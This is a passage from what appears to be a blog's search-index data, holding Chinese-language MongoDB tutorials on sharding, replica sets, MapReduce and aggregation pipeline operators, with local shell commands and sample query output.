首先给我们要建立的片键建立索引：\n\u0026gt; db.test.ensureIndex({\u0026#39;username\u0026#39;: 1}); 然后建立片键：\n\u0026gt; sh.shardCollection(\u0026#39;test.test\u0026#39;, {username:1}); 等待几分钟后，可以通过sh.status方法查看数据分片的情况了，可以从中很清楚的看见哪些数据在哪个分片服务器上面，并且通过explain方法来查看我们查询的过程中哪些分片服务器参与了查询。\n参考 MongoDB权威指南(第2版)\nMongodb Docs\n","permalink":"/posts/mongodb-shares/","summary":"介绍 分片是指将数据拆分，并分散放在多个服务器中组成一个集群，这可以将N台服务器的性能集中到一起来处理数据，这将很大程度的提高数据处理的速度。\n在Mongodb的分片中必须具备三个角色：\n路由服务器：用于处理和响应请求，并把各个分片服务器查询到的结果处理合并然后返回。 配置服务器(configServer)：存储集群、数据的描述信息。 分片服务器：用于储存拆分的数据服务器。 而这三个角色都是普通的数据库，只是扮演的角色不一样。\n它们的请求、响应流程就如下图中表示一样：\n因为所有的应用程序都是通过路由进行请求，所以对于应用程序来说，它没有什么不同就如请求一个普通数据服务器一样：\n搭建配置服务器 首先我们需要搭建配置服务器，配置服务器如同分片的大脑，保存着集群和数据的描述信息。\n因为Mongodb3.4版本后需要配置服务器必须配置为副本集，所以需要给配置服务器配置副本集，如果你还清楚如何搭建副本集，你可以试着看看我的上一篇文章《Mongodb 副本集》。\n首先建立三个空的数据库目录，用于搭建配置服务器的副本集，并分别启动它们，在启动的时候需要加上我们副本集的名称和--configsvr来表示这是一个配置服务器，并分别指定不同的端口。\n$ mkdir config0 config1 config2 $ mongod --dbpath config0 --replSet conServer --configsvr --port 27020 $ mongod --dbpath config1 --replSet conServer --configsvr --port 27021 $ mongod --dbpath config2 --replSet conServer --configsvr --port 27020 然后通过mongo随意进入一个副本集成员，并为配置服务器的副本集进行配置：\n$ mongo --port 27020 --host localhost \u0026gt; var conf = { _id: \u0026#39;conServer\u0026#39;, version: 1, members: [ { _id: 0, host: \u0026#39;localhost:27020\u0026#39; }, { _id: 1, host: \u0026#39;localhost:27021\u0026#39; }, { _id: 2, host: \u0026#39;localhost:27022\u0026#39; } ] }; \u0026gt; rs.","title":"Mongodb 分片"},{"content":"介绍 Mongodb官方提供了一个复制功能，它提供冗余的功能，它可以将数据保存在不同服务器上，并保持多个服务器的数据一致性。\n当主要提供数据的服务器出现了问题不能访问等问题，副本集中的其他服务器会自动替代主要提供数据的服务器进行提供数据功能。\n副本集中有三个角色：\n主节点：所有副节点的数据均来自于主节点，并且只能对主节点进行读写操作。 副节点：数据来自于主节点，可以进行读取操作，但是不能进行写操作。 仲裁者：不含数据也不与客户端交流，只在选举主节点的时候进行投票。 选举机制 Mongodb最多支持50个副本集成员以及最多7个选举成员，启动副本集后将开始第一次选举，在选举过程中，所有副本集成员都只能读取，直到选举出主节点后主节点才能进行读写，但是在这个期间副本成员可以提供查询服务。\n而主节点要保持主节点的位置需要每两秒发送一个ping请求，如果10秒内没有得到响应则标记为不可访问，当一半以上的副本集成员不可访问，那么主节点将降级为副节点。\n其中设置成员的priority值可以优先成员主节点，这个值介于0-1000之间，默认为1，如果这个值为0，那么它的votes值也为0，只要votes为0的成员不能投选举票，但是可以投否决票。但是我们也可以手动设置成员priority值为大于1的成员是否有投票权利。\n在进行选举的时候，其他成员会作以下几点判断来进行投票参与选举的成员是否能作为主节点，选举步骤：\n自己是否能与主节点通讯。 参与选举的成员是否比其他参与选举的成员数据最新。 如果参与选举的成员数据相等则尝试使用具有最高priority的值的成员。 仲裁者 仲裁者的出现是为了避免只有两个成员的副本集，两个成员的副本集投票可能无法满足一半以上的投票情况。\n仲裁者不负责数据和客户端交流，只有参与选举的功能，需要注意的是仲裁者一旦设置过后就再也无法变为非仲裁者了。\n部署副本集 首先部署一个副本集很简单，下面的代码是部署了一个本地含有三个成员的副本集。\n建立三个成员的副本集，首先你得建立三个数据库的存放目录：\nmkdir -p ./replDb/s0 ./replDb/s1 ./replDb/s2 然后我们启动三个副本集成员，其中replSet参数后面跟的是副本集的名称，将需要有关联的成员的副本集名称要一致。\nmongod --dbpath ./replDb/s0 --port 27017 --replSet s0 mongod --dbpath ./replDb/s0 --port 27018 --replSet s0 mongod --dbpath ./replDb/s0 --port 27019 --replSet s0 创建仲裁者也同样非常简单，建立一个空的数据目录，然后和其他副本集成员一样设置同样的副本集名称启动，最后通过rs.add方法的第二个参数设置为true：\nmongod --dbpath ./replDb/s5 --port 27020 --replSet s0 mongod --port 27017 --host localhost \u0026gt; rs.add(\u0026#39;localhost:27020\u0026#39;, true); 然后通过Mongo Shell进入到端口为27017的成员中，并配置副本集。\nmongod --port 27017 --host localhost 进入到Mongo Shell后通过rs.initiate方法来配置副本集。\n\u0026gt; var conf = { _id: \u0026#39;r0\u0026#39;, version: 1, members: [ { _id: 0, host: \u0026#39;localhost:27017\u0026#39; }, { _id: 1, host: \u0026#39;localhost:27018\u0026#39; }, { _id: 2, host: \u0026#39;localhost:27019\u0026#39; }, { _id: 3, host: \u0026#39;localhost:27020\u0026#39; } ] }; \u0026gt; rs.initiate(conf); initiate接受一个对象，对象_id为副本集名称，必须和启动副本集设置的一致才能添加进来(本例为rs0)。version为版本号，每当我们修改副本集配置的时候这个版本号都会递加1，而members则为副本集成员，我们可以在这里一次性添加完，也可以只添加一个后面再通过add方法添加，比如下面这样：\n\u0026gt; rs.add(\u0026#39;localhost:27018\u0026#39;); \u0026gt; rs.add(\u0026#39;localhost:27019\u0026#39;); 删除副本集 删除副本集通过rs.remove方法来删除，它接受一个\u0026lt;localhost\u0026gt;:\u0026lt;port\u0026gt;这样的字符串。下面是删除一个副本集成员：\n\u0026gt; rs.remove(\u0026#39;localhost:27019\u0026#39;); 查询副本集配置 查看副本集配置是通过rs.conf方法查询，返回包含所有副本集的配置内容.\n\u0026gt; rs.conf(); 查询主节点 每当使用rs.add方法添加成员的时候可能会影响选举来选择主节点是谁，查看主节点通过rs.isMaster()方法来查看。\n\u0026gt; rs.isMaster(); 返回的内容中有几个可以了解\n{ \u0026#34;hosts\u0026#34; : [ //副本集成员 \u0026#34;localhost:27017\u0026#34;, \u0026#34;localhost:27018\u0026#34;, \u0026#34;localhost:27019\u0026#34; ], \u0026#34;setName\u0026#34; : \u0026#34;rs0\u0026#34;, //副本集名称 \u0026#34;setVersion\u0026#34; : 3, //副本集配置版本 \u0026#34;ismaster\u0026#34; : true, //是否是主节点 \u0026#34;primary\u0026#34; : \u0026#34;localhost:27017\u0026#34;, //主节点成员的主机地址 \u0026#34;me\u0026#34; : \u0026#34;localhost:27017\u0026#34;, //当前所在主机 } 读取副节点 副节点默认是无法读取的，我们可以通过rs.setSlaveOk()方法来设置Slave属性为true。下面是设置端口为27018的副节点可以进行读取\nmongod --port 27018 --host localhost \u0026gt; rs.setSlaveOk(); 隐藏成员 隐藏成员通过设置成员的hidden属性为true并且优先值priority为0则可以隐藏此成员，隐藏成员不能当主节点也不能当其他成员的复制源\n\u0026gt; rs.add({ \u0026gt; _id: 1, \u0026gt; _host: \u0026#39;localhost:27017\u0026#39;, \u0026gt; hidden: true, \u0026gt; priority: 0 \u0026gt; }) 延迟复制 通过设置成员的slaveDelay的值并且优先值priority为0，来让当前成员滞后多少秒后才开始复制数据。\n\u0026gt; rs.add({ \u0026gt; _id: 1, \u0026gt; _host: \u0026#39;localhost:27017\u0026#39;, \u0026gt; slaveDelay: 120, \u0026gt; priority: 0 \u0026gt; }) 索引管理 通过成员的buildIndexes的值并且优先值priority为0，来设置是否在备份机器上建立相同的索引，一般这个选项只用于纯粹备份的服务器。\n下面的代码设置添加的副本集成员不创建索引。\n\u0026gt; rs.add({ \u0026gt; _id: 1, \u0026gt; _host: \u0026#39;localhost:27017\u0026#39;, \u0026gt; buildIndexes: false \u0026gt; priority: 0 \u0026gt; }) 参考 MongoDB权威指南(第2版)\nMongodb Docs\n","permalink":"/posts/mongodb-replica/","summary":"介绍 Mongodb官方提供了一个复制功能，它提供冗余的功能，它可以将数据保存在不同服务器上，并保持多个服务器的数据一致性。\n当主要提供数据的服务器出现了问题不能访问等问题，副本集中的其他服务器会自动替代主要提供数据的服务器进行提供数据功能。\n副本集中有三个角色：\n主节点：所有副节点的数据均来自于主节点，并且只能对主节点进行读写操作。 副节点：数据来自于主节点，可以进行读取操作，但是不能进行写操作。 仲裁者：不含数据也不与客户端交流，只在选举主节点的时候进行投票。 选举机制 Mongodb最多支持50个副本集成员以及最多7个选举成员，启动副本集后将开始第一次选举，在选举过程中，所有副本集成员都只能读取，直到选举出主节点后主节点才能进行读写，但是在这个期间副本成员可以提供查询服务。\n而主节点要保持主节点的位置需要每两秒发送一个ping请求，如果10秒内没有得到响应则标记为不可访问，当一半以上的副本集成员不可访问，那么主节点将降级为副节点。\n其中设置成员的priority值可以优先成员主节点，这个值介于0-1000之间，默认为1，如果这个值为0，那么它的votes值也为0，只要votes为0的成员不能投选举票，但是可以投否决票。但是我们也可以手动设置成员priority值为大于1的成员是否有投票权利。\n在进行选举的时候，其他成员会作以下几点判断来进行投票参与选举的成员是否能作为主节点，选举步骤：\n自己是否能与主节点通讯。 参与选举的成员是否比其他参与选举的成员数据最新。 如果参与选举的成员数据相等则尝试使用具有最高priority的值的成员。 仲裁者 仲裁者的出现是为了避免只有两个成员的副本集，两个成员的副本集投票可能无法满足一半以上的投票情况。\n仲裁者不负责数据和客户端交流，只有参与选举的功能，需要注意的是仲裁者一旦设置过后就再也无法变为非仲裁者了。\n部署副本集 首先部署一个副本集很简单，下面的代码是部署了一个本地含有三个成员的副本集。\n建立三个成员的副本集，首先你得建立三个数据库的存放目录：\nmkdir -p ./replDb/s0 ./replDb/s1 ./replDb/s2 然后我们启动三个副本集成员，其中replSet参数后面跟的是副本集的名称，将需要有关联的成员的副本集名称要一致。\nmongod --dbpath ./replDb/s0 --port 27017 --replSet s0 mongod --dbpath ./replDb/s0 --port 27018 --replSet s0 mongod --dbpath ./replDb/s0 --port 27019 --replSet s0 创建仲裁者也同样非常简单，建立一个空的数据目录，然后和其他副本集成员一样设置同样的副本集名称启动，最后通过rs.add方法的第二个参数设置为true：\nmongod --dbpath ./replDb/s5 --port 27020 --replSet s0 mongod --port 27017 --host localhost \u0026gt; rs.add(\u0026#39;localhost:27020\u0026#39;, true); 然后通过Mongo Shell进入到端口为27017的成员中，并配置副本集。\nmongod --port 27017 --host localhost 进入到Mongo Shell后通过rs.","title":"Mongodb 副本集"},{"content":"前言 在上一节中说到了appregate聚合功能，聚合功能已经非常强大了，但是如果你还是无法通过聚合解决问题的话，那么你可能需要使用MapReduce了。\nMapReduce提供了Javascript的解释器，所以非常的强大，并且MapReduce可以在多台服务器之间并行的执行，将一个大问题拆分为多个小问题然后分发执行并返回，但是这样的代价就是牺牲了速度，所以才产品发布环境中尽量不要使用MapReduce，因为会很慢很慢。\nMapReduce分为两个部分，一个为map一个为reduce，它们两个都是一个纯Js函数，map分别对作用的集合里的每一个文档传入自身函数进行调用返回了一个不同键值对组成的一个列表，就像下面这样：\n[ a: [1,3,4], b: [5,3,4] ] 而reduce就是对map执行完后的一个列表进行统计，最后返回。Reduce非常像appregate中的group分组。\n如果上面的文字你还是听着有点模糊不清，那么下面这张图可以很好的帮助你理解MapReduce,然后看完文章你一定要在执行环境下实验，才能更好的理解强大的MapReduce，因为MapReduce不止存在于Mongodb中，它是由Google解决分布式计算提出的一种概念，Mongodb只是对这个概念的实现，所以MapReduce会出现在任何的一种数据库中。\n图片原地址：壮壮熊\n官方语法 官方文档中MapReduce的语法如下：\ndb.collection.mapReduce( \u0026lt;map\u0026gt;, \u0026lt;reduce\u0026gt;, { out: \u0026lt;collection\u0026gt;, query: \u0026lt;document\u0026gt;, sort: \u0026lt;document\u0026gt;, limit: \u0026lt;number\u0026gt;, finalize: \u0026lt;function\u0026gt;, scope: \u0026lt;document\u0026gt;, jsMode: \u0026lt;boolean\u0026gt;, verbose: \u0026lt;boolean\u0026gt;, bypassDocumentValidation: \u0026lt;boolean\u0026gt; } ); 除了上面所说的map和reduce函数之外，Mongodb还增加了一个选项，在这里选项里面我们可以快速的筛选一部分文档，给MapReduce，这么做的愿意是尽可能的让MapReduce执行更快，比如上面的query可以过滤一些不符合的文档、sort排序、limit限制返回的文档数量等，如果你需要筛选文档、排序、限制等操作，尽量在选项中进行操作，因为如果你让1000文档每个文档遍历给Js函数快还是让Mongodb内部查询1000个文档快？当然是后者。\nMap map函数的作用是对集合中的每个文档进行调用，map函数是一个纯Js函数，它接受一个this对象，这个this对象代表的就是每个文档，我们可以通过this.xxx来调用文档里面的键值，并在内部调用一个名为emit的函数用于生成列表传给reduce函数，emit函数接受两个参数key和value，然后会将相同键名的合成一个键，并把值储存在一个数组当中，通常可以将这个过程称为“洗牌”。\nfunction map(){ emit(this.num, this.str); } 通常返回的文档大概为：\n[ 5: [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;], 6: [\u0026#39;b\u0026#39;, \u0026#39;d\u0026#39;] ] Reduce reduce函数通过map函数里面的洗牌，接受一个key和values，返回的所有文档中只会存在一个唯一的key，如果相同key的值则储存在数组中，在这一步我们可以将key键名相同的值进行操作然后返回一个对象，最后得到结果，这一步一般称为简化。\nfunction reduce(key, values){ return {values: values} } 实例 mapReduce函数返回的是一个集合的引用，我们可以通过.运算符直接运行Mongodb提供的一些集合操作方法。除此之外我们还可以通过选项中的out设置一个临时的集合，我们可以通过db.xxx来访问这个临时的集合。\n下面的例子是通过MapReduce找到含有num为5的文档，并返回所有含有num为5的文档中str键的值。\n通过下面的代码我们插入100个文档\nfor(var i = 0; i \u0026lt; 100; i++){ db.test.insert({ num: Math.floor(Math.random()* 10), str: \u0026#39;a\u0026#39; + Math.floor(Math.random()* 10) }) } 然后设计我们的MapReduce函数\nfunction map(){ emit(this.num, this.str); } function reduce(key, values){ return {values: values} } db.test.mapReduce(map, reduce, { query: { num: 5 }, out: \u0026#39;te\u0026#39; }); 然后查看我们返回的集合查看返回的文档\ndb.te.find({}); 返回的文档为： { \u0026#34;_id\u0026#34; : 5, \u0026#34;value\u0026#34; : { \u0026#34;values\u0026#34; : [ \u0026#34;a0\u0026#34;, \u0026#34;a8\u0026#34;, \u0026#34;a6\u0026#34;, \u0026#34;a6\u0026#34;, \u0026#34;a6\u0026#34;, \u0026#34;a1\u0026#34;, \u0026#34;a8\u0026#34;, \u0026#34;a4\u0026#34;, \u0026#34;a3\u0026#34; ] } } 参考 MongoDB权威指南(第2版)\nMongodb Docs\n玩转mongodb（八）：分布式计算\u0026ndash;MapReduce\n","permalink":"/posts/mongodb-mapreduce/","summary":"前言 在上一节中说到了appregate聚合功能，聚合功能已经非常强大了，但是如果你还是无法通过聚合解决问题的话，那么你可能需要使用MapReduce了。\nMapReduce提供了Javascript的解释器，所以非常的强大，并且MapReduce可以在多台服务器之间并行的执行，将一个大问题拆分为多个小问题然后分发执行并返回，但是这样的代价就是牺牲了速度，所以才产品发布环境中尽量不要使用MapReduce，因为会很慢很慢。\nMapReduce分为两个部分，一个为map一个为reduce，它们两个都是一个纯Js函数，map分别对作用的集合里的每一个文档传入自身函数进行调用返回了一个不同键值对组成的一个列表，就像下面这样：\n[ a: [1,3,4], b: [5,3,4] ] 而reduce就是对map执行完后的一个列表进行统计，最后返回。Reduce非常像appregate中的group分组。\n如果上面的文字你还是听着有点模糊不清，那么下面这张图可以很好的帮助你理解MapReduce,然后看完文章你一定要在执行环境下实验，才能更好的理解强大的MapReduce，因为MapReduce不止存在于Mongodb中，它是由Google解决分布式计算提出的一种概念，Mongodb只是对这个概念的实现，所以MapReduce会出现在任何的一种数据库中。\n图片原地址：壮壮熊\n官方语法 官方文档中MapReduce的语法如下：\ndb.collection.mapReduce( \u0026lt;map\u0026gt;, \u0026lt;reduce\u0026gt;, { out: \u0026lt;collection\u0026gt;, query: \u0026lt;document\u0026gt;, sort: \u0026lt;document\u0026gt;, limit: \u0026lt;number\u0026gt;, finalize: \u0026lt;function\u0026gt;, scope: \u0026lt;document\u0026gt;, jsMode: \u0026lt;boolean\u0026gt;, verbose: \u0026lt;boolean\u0026gt;, bypassDocumentValidation: \u0026lt;boolean\u0026gt; } ); 除了上面所说的map和reduce函数之外，Mongodb还增加了一个选项，在这里选项里面我们可以快速的筛选一部分文档，给MapReduce，这么做的愿意是尽可能的让MapReduce执行更快，比如上面的query可以过滤一些不符合的文档、sort排序、limit限制返回的文档数量等，如果你需要筛选文档、排序、限制等操作，尽量在选项中进行操作，因为如果你让1000文档每个文档遍历给Js函数快还是让Mongodb内部查询1000个文档快？当然是后者。\nMap map函数的作用是对集合中的每个文档进行调用，map函数是一个纯Js函数，它接受一个this对象，这个this对象代表的就是每个文档，我们可以通过this.xxx来调用文档里面的键值，并在内部调用一个名为emit的函数用于生成列表传给reduce函数，emit函数接受两个参数key和value，然后会将相同键名的合成一个键，并把值储存在一个数组当中，通常可以将这个过程称为“洗牌”。\nfunction map(){ emit(this.num, this.str); } 通常返回的文档大概为：\n[ 5: [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;], 6: [\u0026#39;b\u0026#39;, \u0026#39;d\u0026#39;] ] Reduce reduce函数通过map函数里面的洗牌，接受一个key和values，返回的所有文档中只会存在一个唯一的key，如果相同key的值则储存在数组中，在这一步我们可以将key键名相同的值进行操作然后返回一个对象，最后得到结果，这一步一般称为简化。\nfunction reduce(key, values){ return {values: values} } 实例 mapReduce函数返回的是一个集合的引用，我们可以通过.运算符直接运行Mongodb提供的一些集合操作方法。除此之外我们还可以通过选项中的out设置一个临时的集合，我们可以通过db.xxx来访问这个临时的集合。\n下面的例子是通过MapReduce找到含有num为5的文档，并返回所有含有num为5的文档中str键的值。\n通过下面的代码我们插入100个文档\nfor(var i = 0; i \u0026lt; 100; i++){ db.","title":"Mongodb MapReduce"},{"content":"参考 MongoDB权威指南(第2版)\nMongodb Docs\n前言 Mongodb提供了一个强大的处理框架，可以对集合中的文档进行各种组合、过滤、输出，如果你通过Mongodb其他的查询方法无法处理你的查询或者查询难度很高，那么你可以试试聚合。\n这里我们只讲解一下常用的聚合管道操作符，其他的可以自行到官方文档进行查询。\n语法 官方文档的聚合语法是这样的：\ndb.collection.aggregate（pipeline，options); 聚合：计算集合或视图中数据的聚合值，并且聚合接受一个数组，数组的每一个成员都是对象，对象里面子键都代表一个管道操作，按照顺序的从第一个管道操作到最后一个，每次操作完的文档返回给下一个管道操作。\npipeline： 一系列数据聚合操作或阶段。有关详细信息，请参阅 聚合管道运算，在版本2.6中更改：该方法仍然可以将流水线阶段接受为单独的参数，而不是数组中的元素; 但是，如果不指定pipeline为数组，则不能指定 options参数。\noptions:可选的。aggregate()传递给aggregate命令的附加选项。版本2.6中的新功能，仅当您指定pipeline为数组时可用。\n大概我们可以把聚合理解为对文档进行一系列的操作从而达到我们需要的查询文档，聚合提供了很多管道操作符，这些管道操作符就像一根一根的管道一些，而我们通过聚合操作的文档就像管道里面的水，这根管道流下来的水继续流到下一根管道，直到没有了管道，水就流出来了。 我将在下面讲解几个常用的管道操作符，你也可以单独使用其中任意的管道操作符，分别为：\nmatch(过滤): 过滤文档流，只允许匹配的文档未修改地传递到下一个流水线阶段。$match 使用标准的MongoDB查询。对于每个输入文档，输出一个文档（匹配）或零个文档（不匹配）。\n$project(映射)：重新整理流中的每个文档，例如添加新字段或删除现有字段。对于每个输入文档，输出一个文档。\n$group(分组)：通过一些指定的累加器将组文档输出到下一阶段，为每个不同的分组输出文档。\n$unwind(拆分)：从输入文档中解构一个数组字段，以输出每个元素的文档。每个输出文档用元素值替换数组。对于每个输入文档，输出n个文档，其中n是数组元素的数量，对于空数组可以为零。\n$sort(排序)：按指定的排序键重新排序文档流。\n$limit(限制)：将前n个文档传递到管道，n是一个数字。\n$skip(跳过)：将前n个文档丢弃，后面的部分传递到管道。\n上面的顺序一般是我们常用的顺序，首先我们筛选一部分文档，然后从筛选中整理一份更加便于我们操作的文档，然后在对整理好的文档通过一些表达式来分组整理，然后通过排序、限制、跳过，得到我们最终的结果。 在管道操作符中如果需要指定文档中的某个键的时候，需要在键名前面加上$符号，比如文档中的name键，在管道操作中要指定它就得这样写$name。 并且我们所有的操作的文档都不是操作储存在硬盘中的数据，我们操作的文档都是储存在内存当中，所以不影响原始数据。\n管道操作符 $match $match应尽量放在聚合的最前面，因为$match使用的是Mongodb的标准查询，所以可以使用索引来提高我们的效率，其次是可以过滤掉不需要的文档，让后续的操作更加效率。 既然是标准的查询我们就可以使用标准查询里面所有操作符。 下面来大概演示一下$match的操作方法： 实例的文档结构如下:\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc95fe835e68f199c8686\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 80, \u0026#34;views\u0026#34; : 100 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc962e835e68f199c8687\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 85, \u0026#34;views\u0026#34; : 521 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b257\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ahn\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 1000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b258\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 55, \u0026#34;views\u0026#34; : 5000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b259\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;annT\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 50 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25a\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 94, \u0026#34;views\u0026#34; : 999 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25b\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ty\u0026#34;, \u0026#34;score\u0026#34; : 95, \u0026#34;views\u0026#34; : 1000 } 查询author键的值为dave的文档：\ndb.blog.aggregate([ { $match: { author: \u0026#39;dave\u0026#39; } } ]); 返回的文档为：\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc95fe835e68f199c8686\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 80, \u0026#34;views\u0026#34; : 100 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc962e835e68f199c8687\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 85, \u0026#34;views\u0026#34; : 521 } $project 映射管道操作就如最开始介绍的，整理文档便于我们后面更好的操作，它可以重新命名键，还可以去除不需要的键。 实例的文档结构如下:\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc95fe835e68f199c8686\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 80, \u0026#34;views\u0026#34; : 100 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc962e835e68f199c8687\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 85, \u0026#34;views\u0026#34; : 521 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b257\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ahn\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 1000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b258\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 55, \u0026#34;views\u0026#34; : 5000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b259\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;annT\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 50 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25a\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 94, \u0026#34;views\u0026#34; : 999 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25b\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ty\u0026#34;, \u0026#34;score\u0026#34; : 95, \u0026#34;views\u0026#34; : 1000 } 重新命名author为name，这里需要注意的是重新命名键需要给文档中原始的键名前面加上一个$符号，并只输出name和score： 代码：\ndb.blog.aggregate([ { $project: { name: \u0026#39;$author\u0026#39;, score: 1, } } ]); 返回的文档内容（Mongodb中所有的文档是默认返回_id，除非显示的声明它不需要返回）：\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc95fe835e68f199c8686\u0026#34;), \u0026#34;score\u0026#34; : 80, \u0026#34;name\u0026#34; : \u0026#34;dave\u0026#34; } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc962e835e68f199c8687\u0026#34;), \u0026#34;score\u0026#34; : 85, \u0026#34;name\u0026#34; : \u0026#34;dave\u0026#34; } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b257\u0026#34;), \u0026#34;score\u0026#34; : 60, \u0026#34;name\u0026#34; : \u0026#34;ahn\u0026#34; } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b258\u0026#34;), \u0026#34;score\u0026#34; : 55, \u0026#34;name\u0026#34; : \u0026#34;li\u0026#34; } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b259\u0026#34;), \u0026#34;score\u0026#34; : 60, \u0026#34;name\u0026#34; : \u0026#34;annT\u0026#34; } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25a\u0026#34;), \u0026#34;score\u0026#34; : 94, \u0026#34;name\u0026#34; : \u0026#34;li\u0026#34; } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25b\u0026#34;), \u0026#34;score\u0026#34; : 95, \u0026#34;name\u0026#34; : \u0026#34;ty\u0026#34; } $project管道操作符同样支持Mongodb规定的表达式，大家有兴趣可以去看看。 通过表达式我们能更好的操作文档，比如下面，我想给下面的文档中author键为dave的文档中的score加上10分，那么需要用到表达式中的$add操作符，可以像下面这样来操作： 实例的文档结构如下:\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc95fe835e68f199c8686\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 80, \u0026#34;views\u0026#34; : 100 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc962e835e68f199c8687\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 85, \u0026#34;views\u0026#34; : 521 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b257\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ahn\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 1000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b258\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 55, \u0026#34;views\u0026#34; : 5000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b259\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;annT\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 50 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25a\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 94, \u0026#34;views\u0026#34; : 999 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25b\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ty\u0026#34;, \u0026#34;score\u0026#34; : 95, \u0026#34;views\u0026#34; : 1000 } 执行的代码：\ndb.blog.aggregate([ { $match: { author: \u0026#39;dave\u0026#39; } }, { $project: { score: { $add: [\u0026#39;$score\u0026#39;, 10] }, author: 1, _id: 0 } } ]); 返回的文档内容：\n{ \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 90 } { \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 95 } $group 分组的作用是将文档中键的值，分成不同的组，然后通过累加器操作，然后输出文档，在进行$group管道操作中，_id键是必须存在的。 比如下面我需要将文档中author键的值相同的文档作一个统计： 实例的文档结构如下:\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc95fe835e68f199c8686\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 80, \u0026#34;views\u0026#34; : 100 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc962e835e68f199c8687\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 85, \u0026#34;views\u0026#34; : 521 } { 